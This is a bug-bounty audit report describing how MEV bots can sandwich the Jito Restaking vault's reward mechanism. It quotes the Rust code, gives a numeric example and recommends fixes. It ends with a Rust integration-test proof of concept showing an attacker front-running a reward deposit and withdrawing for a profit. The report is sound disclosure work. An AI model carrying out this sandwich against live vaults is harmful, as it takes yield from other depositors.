# #36903 \[SC-High] The vault reward mechanism can be sandwiched by MEV

**Submitted on Nov 19th 2024 at 10:35:35 UTC by @Hoverfly9132 for** [**Audit Comp | Jito Restaking**](https://immunefi.com/audit-competition/jito-restaking-audit-competition)

* **Report ID:** #36903
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/jito-foundation/restaking/tree/master/vault\\_program>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The vault reward mechanism can be sandwiched by MEV to gain profits.

## Vulnerability Details

When any SPL tokens are rewarded to the vault, the vault will update the VRT and total deposited amounts after calculating the reward fee:

```rust
// 1. Calculate reward fee in ST
pub fn process_update_vault_balance(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
) -> ProgramResult {
    ...
    let st_rewards = new_st_balance.saturating_sub(vault.tokens_deposited());
    let st_reward_fee = vault.calculate_st_reward_fee(new_st_balance)?;

    // 2. Increment ST less the reward fee
    let st_balance_after_fees = new_st_balance
        .checked_sub(st_reward_fee)
        .ok_or(VaultError::ArithmeticUnderflow)?;
    // @audit - update the vault's ST balance
    vault.set_tokens_deposited(st_balance_after_fees);

    // 3. Calculate the reward fee in VRT
    let vrt_reward_fee = vault.calculate_vrt_mint_amount(st_reward_fee)?;

    // 4. Update State, with the vrt fee and the new st balance
    vault.set_tokens_deposited(new_st_balance);
    // @audit - increment the vault's VRT supply with the `vrt_reward_fee`.
    vault.increment_vrt_supply(vrt_reward_fee)?;
    ...
}
```

This instruction will update the vault's VRT and total deposited amounts, if the increased total deposited amounts greater than the increased VRT supply, the exchange rate when burning the VRT: `total_deposited/VRT` will be increased, such that any users can redeem more ST with the same amount of VRT.

For example, both the total deposited amounts and VRT supply are `100000`, so the exchange rate is 1:1 at first, whether minting or burning VRT.

If some SPL tokens are rewarded to the vault with `10000`, reward fee is `1%`, the `st_reward_fee = 110000 * 1% = 1100`, the total deposited amounts will be updated to `110000 - 1100 = 108900`, the `vrt_reward_fee = 1100 * 100000/108900 = 1010`, so the new VRT supply will be `100000 + 1010 = 101010`. When users withdraw SPL tokens with VRT at this time, the exchange rate between SPL token and VRT supply is `108900/101010 ~= 1.078` greater than 1, so any users can gain profits by sandwich when the supported SPL tokens are rewarded to the vault.

## Impact

The vault reward mechanism can be sandwiched by MEV to gain profits from other users' yield.

Severity: High, because any MEV can gain profits from other users' yield, belong to `Theft of unclaimed yield` impact scope, also can be found in [immunefi-vulnerability-severity-classification-system-v2-3](https://immunefi.com/immunefi-vulnerability-severity-classification-system-v2-3/).

## Recommendation

Implement a lock-up period for new deposited users, this should prevent any users can withdraw SPL tokens immediately after the SPL tokens are rewarded to the vault.

Or distriubute the rewards based on the time of the deposit, the longer the deposit time, the more rewards will be distributed.

## Proof of Concept

## Proof of Concept

This is a PoC of the above issue, please see the comments for the detailed steps, insert the case to `integration_tests/tests/vault/burn_withdrawal_ticket.rs` file then run `cargo-build-sbf && SBF_OUT_DIR=$(pwd)/target/sbf-solana-solana/release cargo nextest run --all-features test_burn_withdrawal_ticket_basic_success_with_update_vault_balance --verbose`:

```rust
 #[tokio::test]
async fn test_burn_withdrawal_ticket_basic_success_with_update_vault_balance() {
    const MINT_AMOUNT: u64 = 100_000;
    const WITHDRAWAL_AMOUNT: u64 = 10_000;

    let deposit_fee_bps = 0;
    let withdraw_fee_bps = 0;
    // set reward_fee_bps -> 1%
    let reward_fee_bps = 100;
    let num_operators = 1;
    let slasher_amounts = vec![];

    let mut fixture = TestBuilder::new().await;
    let ConfiguredVault {
        mut vault_program_client,
        restaking_program_client: _,
        vault_config_admin: _,
        vault_root,
        restaking_config_admin: _,
        operator_roots,
    } = fixture
        .setup_vault_with_ncn_and_operators(
            deposit_fee_bps,
            withdraw_fee_bps,
            reward_fee_bps,
            num_operators,
            &slasher_amounts,
        )
        .await
        .unwrap();

    // 1. initial deposit + mint to the depositor with MINT_AMOUNT and delegate all funds to the operator
    let depositor = Keypair::new();
    vault_program_client
        .configure_depositor(&vault_root, &depositor.pubkey(), MINT_AMOUNT)
        .await
        .unwrap();
    vault_program_client
        .do_mint_to(&vault_root, &depositor, MINT_AMOUNT, MINT_AMOUNT)
        .await
        .unwrap();

    vault_program_client
        .do_add_delegation(&vault_root, &operator_roots[0].operator_pubkey, MINT_AMOUNT)
        .await
        .unwrap();

    // 2. attacker monitor some rewarders is sending spl tokens to the vault as rewards in the mempool,
    // and front-run the rewarders txs, initial deposit + mint to the attacker with WITHDRAWAL_AMOUNT
    let attacker = Keypair::new();
    vault_program_client
        .configure_depositor(&vault_root, &attacker.pubkey(), WITHDRAWAL_AMOUNT)
        .await
        .unwrap();
    vault_program_client
        .do_mint_to(&vault_root, &attacker, WITHDRAWAL_AMOUNT, WITHDRAWAL_AMOUNT)
        .await
        .unwrap();

    // 3. rewarder transfer spl token reward to the vault with MINT_AMOUNT/10
    let rewarder: Keypair = Keypair::new();
    vault_program_client
        .configure_depositor(&vault_root, &rewarder.pubkey(), MINT_AMOUNT/3)
        .await
        .unwrap();

    vault_program_client
        .create_and_fund_reward_vault(&vault_root.vault_pubkey, &rewarder, MINT_AMOUNT/10)
        .await
        .unwrap();

    // 4. Attacker initiate enqueue withdrawal with WITHDRAWAL_AMOUNT
    let VaultStakerWithdrawalTicketRoot { base } = vault_program_client
        .do_enqueue_withdrawal(&vault_root, &attacker, WITHDRAWAL_AMOUNT)
        .await
        .unwrap();

    vault_program_client
        .do_cooldown_delegation(&vault_root, &operator_roots[0].operator_pubkey, WITHDRAWAL_AMOUNT)
        .await
        .unwrap();

    // 5. Waiting for epochs to pass
    let config = vault_program_client
    .get_config(&Config::find_program_address(&jito_vault_program::id()).0)
    .await
    .unwrap();

    fixture
        .warp_slot_incremental(config.epoch_length())
        .await
        .unwrap();
    vault_program_client
        .do_full_vault_update(
            &vault_root.vault_pubkey,
            &[operator_roots[0].operator_pubkey],
        )
        .await
        .unwrap();
    fixture
        .warp_slot_incremental(config.epoch_length())
        .await
        .unwrap();
    vault_program_client
        .do_full_vault_update(
            &vault_root.vault_pubkey,
            &[operator_roots[0].operator_pubkey],
        )
        .await
        .unwrap();

    vault_program_client
        .do_burn_withdrawal_ticket(&vault_root, &attacker, &base, &config.program_fee_wallet)
        .await
        .unwrap();
    
    // 6. check the amounts of the attacker's token account
    let vault = vault_program_client
        .get_vault(&vault_root.vault_pubkey)
        .await
        .unwrap();

    let attacker_token_account = fixture
        .get_token_account(&get_associated_token_address(
            &attacker.pubkey(),
            &vault.supported_mint,
        ))
        .await
        .unwrap();
    
    // attacker mint VRT with 10000 spl tokens at first, then withdraw spl tokens with 10000 VRT, 10000 * 120000/110091 = 10900 > WITHDRAWAL_AMOUNT.
    assert_eq!(attacker_token_account.amount, WITHDRAWAL_AMOUNT + 900);
}
```
